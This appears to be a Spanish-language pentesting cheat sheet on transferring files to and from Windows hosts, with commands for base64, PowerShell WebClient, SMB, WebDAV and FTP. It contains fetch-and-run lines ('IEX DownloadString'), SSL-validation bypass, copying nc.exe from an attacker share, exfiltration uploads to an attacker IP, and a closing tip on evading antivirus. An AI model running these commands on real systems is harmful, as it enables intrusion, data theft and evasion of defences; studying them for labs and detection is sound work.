# Transferencia de Archivos en Windows

Windows dispone de múltiples utilidades nativas para transferir archivos. Conocerlas es esencial tanto para el atacante (que las usa para operar sin levantar sospechas) como para el defensor (que las monitoriza para detectar comportamiento anómalo).

### Descargas

#### PowerShell — Base64

Cuando no hay conectividad de red disponible o los métodos HTTP están bloqueados, se puede codificar un archivo en base64, copiar el texto y decodificarlo en el destino. No genera tráfico de red.

```bash
# En Linux — calcular el hash y codificar
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

```powershell
# En Windows — decodificar y escribir el archivo
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTi..."))

# Verificar el hash para confirmar la integridad
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

> El límite de longitud de cadena en `cmd.exe` es 8.191 caracteres. Para archivos grandes este método no es viable.

#### PowerShell — Descarga HTTP/HTTPS

`System.Net.WebClient` es la clase más versátil para descargas en cualquier versión de PowerShell.

```powershell
# DownloadFile — guarda en disco
(New-Object Net.WebClient).DownloadFile('https://servidor/archivo.ps1', 'C:\Users\Public\archivo.ps1')

# DownloadFileAsync — no bloquea el hilo
(New-Object Net.WebClient).DownloadFileAsync('https://servidor/archivo.ps1', 'C:\Users\Public\archivo.ps1')

# DownloadString + IEX — ejecución en memoria (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://servidor/script.ps1')

# Con pipeline
(New-Object Net.WebClient).DownloadString('https://servidor/script.ps1') | IEX
```

```powershell
# Invoke-WebRequest (PowerShell 3.0+) — más lento pero más moderno
Invoke-WebRequest https://servidor/archivo.ps1 -OutFile archivo.ps1

# Alias disponibles: iwr, curl, wget
```

**Errores comunes y soluciones:**

```powershell
# Error: Internet Explorer no configurado
Invoke-WebRequest https://servidor/archivo.ps1 -UseBasicParsing | IEX

# Error: certificado SSL no confiado
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### SMB

SMB es el método más cómodo en redes Windows donde el puerto 445 está disponible.

```bash
# En el atacante — levantar servidor SMB con Impacket
sudo impacket-smbserver share -smb2support /tmp/archivos

# Con autenticación (necesario en Windows modernos)
sudo impacket-smbserver share -smb2support /tmp/archivos -user usuario -password contraseña
```

```cmd
# En Windows — copiar desde el share
copy \\192.168.1.100\share\nc.exe

# Si hay bloqueo de guest access, montar con credenciales
net use n: \\192.168.1.100\share /user:usuario contraseña
copy n:\nc.exe
```

#### SMB sobre HTTP con WebDAV

Cuando el puerto 445 está bloqueado saliente pero el 80/443 no, WebDAV permite usar SMB sobre HTTP.

```bash
# Instalar dependencias
sudo pip3 install wsgidav cheroot

# Levantar servidor WebDAV
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
# Conectar desde Windows
dir \\192.168.1.100\DavWWWRoot
copy C:\archivo.zip \\192.168.1.100\DavWWWRoot\
```

#### FTP

```bash
# En el atacante — servidor FTP con Python
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Descargar con PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.100/archivo.txt', 'C:\Users\Public\archivo.txt')
```

```cmd
# Descargar con cliente FTP nativo (útil sin shell interactiva)
echo open 192.168.1.100 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET archivo.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### Subidas

#### PowerShell — Base64

```powershell
# Codificar el archivo en Windows
[Convert]::ToBase64String((Get-Content -Path 'C:\archivo.txt' -Encoding Byte))
Get-FileHash 'C:\archivo.txt' -Algorithm MD5 | select Hash
```

```bash
# Decodificar en Linux
echo "BASE64STRING" | base64 -d > archivo.txt
md5sum archivo.txt
```

#### PowerShell — Upload HTTP

```bash
# En el atacante — servidor con soporte de upload
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
# Subir con PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.1.100:8000/upload -File C:\archivo.txt
```

```powershell
# Alternativa — base64 via POST capturado con Netcat
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\archivo.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.1.100:8000/ -Method POST -Body $b64
```

```bash
# Capturar con Netcat y decodificar
nc -lvnp 8000
echo "BASE64" | base64 -d -w 0 > archivo.txt
```

#### FTP Upload

```bash
# Servidor FTP con permisos de escritura
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Subir con PowerShell
(New-Object Net.WebClient).UploadFile('ftp://192.168.1.100/archivo.txt', 'C:\Windows\System32\drivers\etc\hosts')
```

```cmd
# Con cliente FTP nativo
echo open 192.168.1.100 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo PUT C:\archivo.txt >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

### Referencia rápida — métodos por puerto

| Método          | Puerto  | Notas                                         |
| --------------- | ------- | --------------------------------------------- |
| PowerShell HTTP | 80/443  | El más universal, generalmente permitido      |
| SMB / Impacket  | 445     | Muy cómodo, frecuentemente bloqueado saliente |
| WebDAV          | 80/443  | SMB sobre HTTP, elude bloqueo de 445          |
| FTP             | 21      | Frecuentemente bloqueado, útil en labs        |
| Base64          | Sin red | Lento, limitado por tamaño de cadena          |

> El método **fileless** con `IEX` + `DownloadString` es especialmente útil porque el script nunca toca el disco — no queda archivo en el sistema para que el AV lo escanee.
